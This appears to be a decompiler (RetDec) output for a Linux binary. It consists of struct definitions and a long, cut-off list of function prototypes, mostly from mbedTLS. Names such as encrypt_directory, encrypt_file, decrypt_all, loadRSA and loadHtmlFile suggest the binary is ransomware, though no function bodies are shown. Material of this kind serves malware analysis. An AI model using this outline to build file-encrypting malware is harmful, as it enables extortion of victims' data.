//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2017 Retargetable Decompiler <info@retdec.com>
//

#include <dirent.h>
#include <errno.h>
#include <pwd.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

// ----------------- Float Types Definitions ------------------

typedef long double float80_t;

// ------------------------ Structures ------------------------

struct _IO_FILE {
    int32_t e0;
};

struct __dirstream {
    int32_t e0;
};

struct dirent64 {
    int32_t e0;
    int32_t e1;
    int16_t e2;
    char e3;
    char e4[256];
};

struct passwd {
    char * e0;
    char * e1;
    int32_t e2;
    int32_t e3;
    char * e4;
    char * e5;
    char * e6;
};

struct stat {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int32_t e12;
    int32_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
};

struct stat64 {
    int64_t e0;
    int64_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int64_t e6;
    int64_t e7;
    int64_t e8;
    int32_t e9;
    int32_t e10;
    int64_t e11;
    int32_t e12;
    int32_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
};

struct timeval {
    int32_t e0;
    int32_t e1;
};

// ------------------- Function Prototypes --------------------

int32_t __aio_close(int32_t result);
int32_t __block_all_sigs(int32_t a1);
int32_t __block_app_sigs(int32_t a1);
int32_t __copy_tls(int32_t * a1);
int32_t __init_tls(int32_t a1);
int32_t __lctrans_cur(int32_t a1);
int32_t __lctrans_impl(int32_t result);
int32_t __lock(int32_t * a1);
int32_t __lockfile(int32_t a1);
char * __malloc0(int32_t size);
int32_t __ofl_add(int32_t a1);
int32_t __ofl_lock(void);
int32_t __ofl_unlock(void);
int32_t __restore(void);
int32_t __restore_rt(void);
int32_t __restore_sigs(int32_t a1);
void __set_thread_area(int32_t a1, int32_t a2);
int32_t __stdio_close(int32_t a1);
int32_t __stdio_seek(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t __syscall_cp_c(void);
int32_t __syscall_ret(int64_t a1, int64_t a2);
int32_t __unlock(int32_t * a1);
int32_t __unlockfile(int32_t a1);
int32_t __vdsosym(char * str2, char str);
int32_t __vsyscall(int32_t a1, int32_t a2, int32_t a3);
int32_t __vsyscall6(int32_t * a1, int32_t a2);
void _fini(void);
void _init(void);
int32_t _start(void);
void _start_c(int32_t * a1);
int32_t add_one_and_zeros_padding(int32_t a1, int32_t a2, int32_t a3);
int32_t add_pkcs_padding(int32_t a1, int32_t a2, int32_t a3);
int32_t add_zeros_and_len_padding(int32_t a1, int32_t a2, int32_t a3);
int32_t add_zeros_padding(int32_t a1, uint32_t a2, int32_t a3);
int32_t aes_crypt_cbc_wrap(int32_t a1);
int32_t aes_crypt_cfb128_wrap(int32_t a1);
int32_t aes_crypt_ctr_wrap(int32_t a1);
int32_t aes_crypt_ecb_wrap(int32_t a1);
int32_t aes_decrypt(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5);
int32_t aes_encrypt(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5);
int32_t aes_gen_tables(void);
int32_t aes_setkey_dec_wrap(int32_t a1);
int32_t aes_setkey_enc_wrap(int32_t a1);
int32_t arc4_crypt_stream_wrap(int32_t a1);
int32_t arc4_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t arc4_setkey_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t block_cipher_df(int32_t a1, int32_t a2, int32_t a3);
int32_t blowfish_crypt_cbc_wrap(int32_t a1);
int32_t blowfish_crypt_cfb64_wrap(int32_t a1);
int32_t blowfish_crypt_ctr_wrap(int32_t a1);
int32_t blowfish_crypt_ecb_wrap(int32_t a1);
int32_t blowfish_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t blowfish_setkey_wrap(int32_t a1);
int32_t busy_msleep(int32_t a1);
int32_t camellia_crypt_cbc_wrap(int32_t a1);
int32_t camellia_crypt_cfb128_wrap(int32_t a1);
int32_t camellia_crypt_ctr_wrap(int32_t a1);
int32_t camellia_crypt_ecb_wrap(int32_t a1);
int32_t camellia_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t camellia_feistel(int32_t a1, int32_t a2, int32_t a3);
int32_t camellia_setkey_dec_wrap(int32_t a1);
int32_t camellia_setkey_enc_wrap(int32_t a1);
int32_t ccm_aes_setkey_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t ccm_auth_crypt(char * a1, char * a2, int32_t a3, uint32_t a4, int32_t a5, int32_t a6, int32_t a7, char a8);
int32_t ccm_camellia_setkey_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t ccm_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t checkDirStart(int32_t a1);
int32_t checkExclude(char * str);
char * checkFileExt(char * str);
int32_t createDaemon(void);
int32_t ctr_drbg_self_test_entropy(int32_t a1, char * a2, int32_t a3);
int32_t ctr_drbg_update_internal(int32_t a1, int32_t a2);
struct __dirstream * decrypt_all(char * name);
int32_t decrypt_file(int32_t path3, int32_t path4);
int32_t derive_mpi(int32_t a1, int32_t a2, int32_t a3);
int32_t des3_crypt_cbc_wrap(int32_t a1);
int32_t des3_crypt_ecb_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t des3_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t des3_set2key(int32_t a1, int32_t a2);
int32_t des3_set2key_dec_wrap(int32_t a1);
int32_t des3_set2key_enc_wrap(int32_t a1);
int32_t des3_set3key(int32_t a1, int32_t a2);
int32_t des3_set3key_dec_wrap(int32_t a1);
int32_t des3_set3key_enc_wrap(int32_t a1);
int32_t des_crypt_cbc_wrap(int32_t a1);
int32_t des_crypt_ecb_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t des_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t des_setkey_dec_wrap(int32_t a1);
int32_t des_setkey_enc_wrap(int32_t a1);
int32_t dummy_1(void);
int32_t dummy_2(int32_t result);
int32_t ecdsa_can_do(int32_t a1);
int32_t ecdsa_free_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t ecdsa_verify_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t eckey_can_do(int32_t a1);
int32_t eckey_free_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t eckey_get_bitlen(int32_t a1);
int32_t eckey_sign_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t eckey_verify_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t ecp_add_mixed(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t ecp_double_jac(int32_t a1, int32_t a2);
int32_t ecp_group_load(int32_t a1, uint32_t a2, int32_t a3, uint32_t a4, int32_t a5, uint32_t a6, int32_t a7, uint32_t a8, int32_t a9, uint32_t a10, int32_t a11, int32_t a12, int32_t a13);
int32_t ecp_mod_p192(int32_t a1);
int32_t ecp_modp(int32_t a1, int32_t a2);
int32_t ecp_mul_comb(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t ecp_normalize_jac(int32_t a1, int32_t a2);
char * ecp_normalize_jac_many(int32_t a1, int32_t a2, int32_t a3);
int32_t ecp_safe_invert_jac(int32_t a1, int32_t a2, int32_t a3);
int32_t ecp_select_comb(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10);
char * encrypt_directory(char * a1);
int32_t encrypt_file(struct _IO_FILE * path, int32_t a2);
int32_t entropy_gather_internal(int32_t a1);
int32_t entropy_update(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t extract(char * str);
struct __dirstream * find_and_do(char * name, int32_t a2);
int32_t fmt_u(int32_t a1, int32_t a2, int32_t a3);
void function_80480be(void);
int32_t function_8048146(int32_t a1);
int32_t function_804a3b6(int32_t a1);
int32_t function_804b85a(int32_t a1);
int32_t function_804bce7(int32_t a1);
int32_t function_804bd27(int32_t a1);
int32_t function_804c471(void);
int32_t function_804c5fd(int32_t a1);
int32_t function_804cbd7(int32_t a1);
int32_t function_804ceca(int32_t a1);
int32_t function_804d04a(int32_t a1);
int32_t function_804d08d(int32_t a1);
int32_t function_804d3fa(int32_t a1);
int32_t function_804d45a(int32_t a1);
int32_t function_804d496(int32_t a1);
int32_t function_804d7ad(int32_t a1);
int32_t function_804f3e1(void);
int32_t function_804f667(int32_t a1);
int32_t function_8050fbd(int32_t a1);
int32_t function_80513f6(int32_t a1);
int32_t function_8052167(int32_t a1);
int32_t function_8053a47(int32_t a1);
int32_t function_80557a7(int32_t a1);
int32_t function_80558dd(int32_t a1);
int32_t function_8056207(int32_t a1);
int32_t function_80567cd(int32_t a1);
int32_t function_805684d(int32_t a1);
int32_t function_8056ff6(int32_t a1);
int32_t function_805bb97(int32_t a1);
int32_t function_805bea6(int32_t a1);
int32_t function_805d561(void);
int32_t function_805d62a(int32_t a1);
int32_t function_80604cd(int32_t a1);
int32_t function_806187a(int32_t a1);
int32_t function_8061f17(int32_t a1);
int32_t function_806230d(int32_t a1);
int32_t function_80624d1(void);
int32_t function_806314d(int32_t a1);
int32_t function_8063786(int32_t a1);
int32_t function_80639bd(int32_t a1);
int32_t function_8063a76(int32_t a1);
int32_t function_80650b7(int32_t a1);
int32_t function_8066bad(int32_t a1);
int32_t function_8066fb7(int32_t a1);
int32_t function_80687fd(int32_t a1);
int32_t function_80688d7(int32_t a1);
int32_t function_8068bf7(int32_t a1);
int32_t function_8069551(void);
int32_t function_80697ed(int32_t a1);
int32_t function_806996d(int32_t a1);
int32_t function_80699f7(int32_t a1);
int32_t function_806a3f6(int32_t a1);
int32_t function_806b4f1(void);
int32_t function_806d4f7(int32_t a1);
int32_t function_806d531(void);
int32_t function_806f63d(int32_t a1);
int32_t function_8070b8d(void);
int32_t function_8070c56(int32_t result);
void function_8076f91(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t gcm_aes_setkey_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t gcm_camellia_setkey_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t gcm_mult(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t hmac_drbg_self_test_entropy(int32_t a1, char * a2, int32_t a3);
int32_t is_ignore_dir(char * str2);
int32_t is_symlink(char * a1);
struct _IO_FILE * loadHtmlFile(int32_t a1, char ** a2, int32_t a3, int32_t a4, int32_t a5);
int32_t loadRSA(int32_t a1, char ** a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
struct _IO_FILE * loadTextFile(void);
int main(int argc, char ** argv);
int32_t mbedtls_aes_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6);
int32_t mbedtls_aes_crypt_cfb128(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7);
int32_t mbedtls_aes_crypt_ctr(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t mbedtls_aes_crypt_ecb(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_aes_decrypt(int32_t * a1, char * a2, char * a3);
int32_t mbedtls_aes_encrypt(int32_t * a1, char * a2, char * a3);
int32_t mbedtls_aes_free(char * a1);
int32_t mbedtls_aes_init(char * a1);
int32_t mbedtls_aes_self_test(int32_t a1);
int32_t mbedtls_aes_setkey_dec(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_aes_setkey_enc(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_arc4_crypt(int32_t * a1, uint32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_arc4_free(char * a1);
int32_t mbedtls_arc4_init(char * a1);
int32_t mbedtls_arc4_self_test(int32_t a1);
int32_t mbedtls_arc4_setup(int32_t * a1, int32_t a2, uint32_t a3);
int32_t mbedtls_asn1_get_alg(int32_t * a1, int32_t a2, int32_t * a3, char * a4);
int32_t mbedtls_asn1_get_alg_null(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_asn1_get_bitstring_null(int32_t * a1, int32_t a2, int32_t * a3);
int32_t mbedtls_asn1_get_int(int32_t * a1, int32_t a2, int32_t * a3);
int32_t mbedtls_asn1_get_len(int32_t * a1, int32_t a2, int32_t * a3);
int32_t mbedtls_asn1_get_mpi(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_asn1_get_tag(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_asn1_write_len(int32_t * a1, int32_t a2, char a3);
int32_t mbedtls_asn1_write_mpi(int32_t * a1, int32_t a2, int32_t * a3);
int32_t mbedtls_asn1_write_tag(int32_t * a1, int32_t a2, char a3);
int32_t mbedtls_base64_decode(char * a1, uint32_t a2, int32_t * a3, int32_t a4, int32_t a5);
int32_t mbedtls_base64_encode(char * a1, uint32_t a2, int32_t * a3, char * a4, int64_t a5);
int32_t mbedtls_base64_self_test(int32_t a1);
void mbedtls_blowfish_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6);
void mbedtls_blowfish_crypt_cfb64(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7);
void mbedtls_blowfish_crypt_ctr(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t mbedtls_blowfish_crypt_ecb(int32_t * a1, int32_t a2, char * a3, char * a4);
void mbedtls_blowfish_free(char * a1);
void mbedtls_blowfish_setkey(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_camellia_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6);
void mbedtls_camellia_crypt_cfb128(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7);
int32_t mbedtls_camellia_crypt_ctr(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t mbedtls_camellia_crypt_ecb(int32_t * a1, int32_t a2, char * a3);
void mbedtls_camellia_free(char * a1);
int32_t mbedtls_camellia_init(char * a1);
int32_t mbedtls_camellia_self_test(int32_t a1);
int32_t mbedtls_camellia_setkey_dec(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_camellia_setkey_enc(int32_t * a1, int32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_ccm_auth_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, char * a8, int32_t a9, int32_t a10);
int32_t mbedtls_ccm_encrypt_and_tag(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14);
int32_t mbedtls_ccm_free(char * a1);
int32_t mbedtls_ccm_init(char * a1);
int32_t mbedtls_ccm_self_test(int32_t a1);
int32_t mbedtls_ccm_setkey(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_cipher_crypt(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t * a7, int32_t a8);
int32_t mbedtls_cipher_finish(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4);
int32_t mbedtls_cipher_free(char * a1, int32_t a2);
int32_t mbedtls_cipher_info_from_type(int32_t a1);
int32_t mbedtls_cipher_info_from_values(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_cipher_init(char * a1);
int32_t mbedtls_cipher_list(int32_t a1);
int32_t mbedtls_cipher_reset(int32_t * a1);
int32_t mbedtls_cipher_set_iv(int32_t * a1, char * a2, int32_t a3);
int32_t mbedtls_cipher_set_padding_mode(int32_t * a1, int32_t a2);
int32_t mbedtls_cipher_setkey(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_cipher_setup(char * a1, int32_t a2);
int32_t mbedtls_cipher_update(char * a1, char * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_ctr_drbg_free(char * a1);
int32_t mbedtls_ctr_drbg_init(char * a1);
int32_t mbedtls_ctr_drbg_random(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_ctr_drbg_random_with_add(char * a1, int32_t a2, uint32_t a3, char * a4, uint32_t a5);
int32_t mbedtls_ctr_drbg_reseed(int32_t a1, char * a2, int32_t a3);
int32_t mbedtls_ctr_drbg_seed(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t mbedtls_ctr_drbg_seed_entropy_len(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_ctr_drbg_self_test(int32_t a1);
int32_t mbedtls_ctr_drbg_set_entropy_len(int32_t result, int32_t a2);
int32_t mbedtls_ctr_drbg_set_prediction_resistance(int32_t result, int32_t a2);
int32_t mbedtls_ctr_drbg_set_reseed_interval(int32_t result, int32_t a2);
int32_t mbedtls_ctr_drbg_update(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_des3_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6);
int32_t mbedtls_des3_crypt_ecb(int32_t a1, char * a2, char * a3);
int32_t mbedtls_des3_free(char * a1);
int32_t mbedtls_des3_init(char * a1);
int32_t mbedtls_des3_set2key_dec(int32_t a1, int32_t result);
int32_t mbedtls_des3_set2key_enc(int32_t a1, int32_t a2);
int32_t mbedtls_des3_set3key_dec(int32_t a1, int32_t result);
int32_t mbedtls_des3_set3key_enc(int32_t a1, int32_t a2);
int32_t mbedtls_des_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6);
int32_t mbedtls_des_crypt_ecb(int32_t a1, char * a2, char * a3);
int32_t mbedtls_des_free(char * a1);
int32_t mbedtls_des_init(char * a1);
int32_t mbedtls_des_key_check_key_parity(int32_t a1);
int32_t mbedtls_des_key_set_parity(int32_t a1);
int32_t mbedtls_des_self_test(int32_t a1);
int32_t mbedtls_des_setkey(int32_t a1, char * a2);
int32_t mbedtls_des_setkey_dec(int32_t * a1, int32_t a2);
void mbedtls_des_setkey_enc(int32_t a1, int32_t a2);
int32_t mbedtls_ecdsa_free(void);
int32_t mbedtls_ecdsa_from_keypair(int32_t a1, int32_t a2);
int32_t mbedtls_ecdsa_genkey(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
void mbedtls_ecdsa_init(void);
int32_t mbedtls_ecdsa_read_signature(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t mbedtls_ecdsa_sign(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_ecdsa_sign_det(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t mbedtls_ecdsa_verify(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_ecdsa_write_signature(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t * a6);
int32_t mbedtls_ecdsa_write_signature_det(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_ecp_check_privkey(int32_t a1, int32_t a2);
int32_t mbedtls_ecp_check_pubkey(int32_t a1, int32_t a2);
int32_t mbedtls_ecp_copy(int32_t a1, int32_t a2);
int32_t mbedtls_ecp_curve_info_from_grp_id(int32_t a1, int32_t a2);
int32_t mbedtls_ecp_curve_info_from_tls_id(uint32_t a1);
int32_t mbedtls_ecp_curve_list(void);
int32_t mbedtls_ecp_gen_key(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_ecp_gen_keypair(int32_t a1, int32_t a2, int32_t a3, int32_t (*a4)(int32_t, int32_t, int32_t), int32_t a5);
int32_t mbedtls_ecp_group_copy(int32_t a1);
int32_t mbedtls_ecp_group_free(char * a1);
int32_t mbedtls_ecp_group_init(char * a1);
int32_t mbedtls_ecp_group_load(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t mbedtls_ecp_grp_id_list(void);
int32_t mbedtls_ecp_is_zero(int32_t a1);
int32_t mbedtls_ecp_keypair_free(int32_t a1);
int32_t mbedtls_ecp_keypair_init(int32_t a1);
int32_t mbedtls_ecp_mul(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_ecp_muladd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_ecp_point_free(int32_t a1);
int32_t mbedtls_ecp_point_init(int32_t a1);
int32_t mbedtls_ecp_point_read_binary(int32_t a1, int32_t a2, char * a3, int32_t a4);
int32_t mbedtls_ecp_point_read_string(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_ecp_self_test(int32_t a1);
int32_t mbedtls_ecp_set_zero(int32_t a1);
int32_t mbedtls_ecp_tls_read_group(int32_t a1, int32_t a2, uint32_t a3);
int32_t mbedtls_entropy_func(char * a1, int32_t a2, uint32_t a3);
int32_t mbedtls_entropy_gather(int32_t a1, int32_t a2);
int32_t mbedtls_entropy_init(char * a1);
int32_t mbedtls_entropy_self_test(int32_t a1);
int32_t mbedtls_entropy_update_manual(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t mbedtls_gcm_crypt_and_tag(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11);
int32_t mbedtls_gcm_finish(int32_t a1, char * a2, int32_t a3);
int32_t mbedtls_gcm_free(char * a1);
int32_t mbedtls_gcm_init(char * a1);
int32_t mbedtls_gcm_self_test(int32_t a1);
int32_t mbedtls_gcm_setkey(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_gcm_starts(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_gcm_update(int32_t a1, int32_t a2, char * a3, uint32_t a4);
int32_t mbedtls_hmac_drbg_free(char * a1);
int32_t mbedtls_hmac_drbg_init(char * a1);
int32_t mbedtls_hmac_drbg_random(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_hmac_drbg_random_with_add(char * a1, int32_t a2, int32_t a3, char * a4, int32_t a5);
int32_t mbedtls_hmac_drbg_reseed(char * a1, char * a2, uint32_t a3);
char * mbedtls_hmac_drbg_seed(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_hmac_drbg_seed_buf(char * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_hmac_drbg_self_test(int32_t a1);
int32_t mbedtls_hmac_drbg_set_entropy_len(int32_t result, int32_t a2);
int32_t mbedtls_hmac_drbg_set_prediction_resistance(int32_t result, int32_t a2);
int32_t mbedtls_hmac_drbg_set_reseed_interval(int32_t result, int32_t a2);
int32_t mbedtls_hmac_drbg_update(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_md(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_md5(int32_t a1, int32_t a2, int32_t a3);
void mbedtls_md5_clone(char * a1, char * a2);
int32_t mbedtls_md5_finish(int32_t * a1, char * a2);
int32_t mbedtls_md5_free(char * a1);
int32_t mbedtls_md5_init(char * a1);
int32_t mbedtls_md5_process(int32_t result, char * a2);
int32_t mbedtls_md5_self_test(int32_t a1);
int32_t mbedtls_md5_starts(int32_t * a1);
int32_t mbedtls_md5_update(char * a1, char * a2, uint32_t a3);
int32_t mbedtls_md_finish(int32_t * a1, int32_t a2);
int32_t mbedtls_md_free(char * a1);
int32_t mbedtls_md_get_name(int32_t a1);
int32_t mbedtls_md_get_size(int32_t a1);
int32_t mbedtls_md_hmac(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_md_hmac_finish(int32_t * a1, int32_t a2);
int32_t mbedtls_md_hmac_reset(int32_t * a1);
int32_t mbedtls_md_hmac_starts(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_md_hmac_update(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_md_info_from_type(int32_t a1);
int32_t mbedtls_md_init(int32_t * a1);
int32_t mbedtls_md_init_ctx(int32_t a1, int32_t a2);
int32_t mbedtls_md_list(void);
int32_t mbedtls_md_setup(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_md_starts(int32_t * a1);
int32_t mbedtls_md_update(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_add_abs(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_add_int(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_add_mpi(int32_t * a1, int32_t * a2, int32_t * a3);
int32_t mbedtls_mpi_bitlen(int32_t a1, int32_t a2);
int32_t mbedtls_mpi_cmp_abs(int32_t a1, int32_t a2);
int32_t mbedtls_mpi_cmp_int(int32_t a1, int32_t a2);
int32_t mbedtls_mpi_cmp_mpi(int32_t * a1, int32_t * a2);
int32_t mbedtls_mpi_copy(char * a1, int32_t * a2);
int32_t mbedtls_mpi_div_int(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_mpi_div_mpi(int32_t * a1, int32_t * a2, int32_t * a3, int32_t * a4);
int32_t mbedtls_mpi_exp_mod(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, char * a5);
int32_t mbedtls_mpi_fill_random(int32_t a1, uint32_t a2, int32_t (*a3)(int32_t, int32_t, int32_t), int32_t a4);
int32_t mbedtls_mpi_free(int32_t * a1);
int32_t mbedtls_mpi_gcd(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_gen_prime(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t mbedtls_mpi_get_bit(int32_t a1, uint32_t a2);
int32_t mbedtls_mpi_grow(int32_t a1, char * a2);
int32_t mbedtls_mpi_init(int32_t * a1);
int32_t mbedtls_mpi_inv_mod(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_is_prime(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_lsb(int32_t a1);
int32_t mbedtls_mpi_lset(char * a1, int32_t a2);
int32_t mbedtls_mpi_mod_int(int32_t * a1, int32_t * a2, int64_t a3);
int32_t mbedtls_mpi_mod_mpi(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_mul_int(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_mul_mpi(int32_t * a1, int32_t * a2, int32_t * a3);
int32_t mbedtls_mpi_read_binary(int32_t a1, char * a2, uint32_t a3);
int32_t mbedtls_mpi_read_string(char * a1, uint32_t a2, char * str);
int32_t mbedtls_mpi_safe_cond_assign(int32_t * a1, int32_t * a2, uint32_t a3);
int32_t mbedtls_mpi_safe_cond_swap(int32_t * a1, int32_t * a2, uint32_t a3);
int32_t mbedtls_mpi_self_test(int32_t a1);
int32_t mbedtls_mpi_set_bit(int32_t a1, uint32_t a2, uint32_t a3);
int32_t mbedtls_mpi_shift_l(int32_t a1, uint32_t a2);
int32_t mbedtls_mpi_shift_r(int32_t a1, uint32_t a2);
int32_t mbedtls_mpi_shrink(int32_t a1, char * a2);
int32_t mbedtls_mpi_size(int32_t a1);
int32_t mbedtls_mpi_sub_abs(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_sub_int(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_sub_mpi(int32_t * a1, int32_t * a2, int32_t * a3);
int32_t mbedtls_mpi_write_binary(char * a1, int32_t a2, int32_t a3);
int32_t mbedtls_mpi_write_string(int32_t * a1, int32_t a2, char * a3, uint32_t a4, int32_t * a5);
int32_t mbedtls_oid_get_cipher_alg(int32_t a1, int32_t * a2);
int32_t mbedtls_oid_get_ec_grp(int32_t a1, int32_t * a2);
int32_t mbedtls_oid_get_md_alg(int32_t a1, int32_t * a2);
int32_t mbedtls_oid_get_oid_by_md(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4);
int32_t mbedtls_oid_get_pk_alg(int32_t a1, int32_t * a2);
int32_t mbedtls_oid_get_pkcs12_pbe_alg(int32_t a1, int32_t * a2, int32_t * a3);
int32_t mbedtls_padlock_has_support(int32_t a1, int32_t a2);
int32_t mbedtls_padlock_xcryptcbc(int32_t * a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5, int32_t * a6);
int32_t mbedtls_padlock_xcryptecb(int32_t * a1, int32_t a2, int32_t * a3, int32_t * a4);
int32_t mbedtls_pem_free(char * a1);
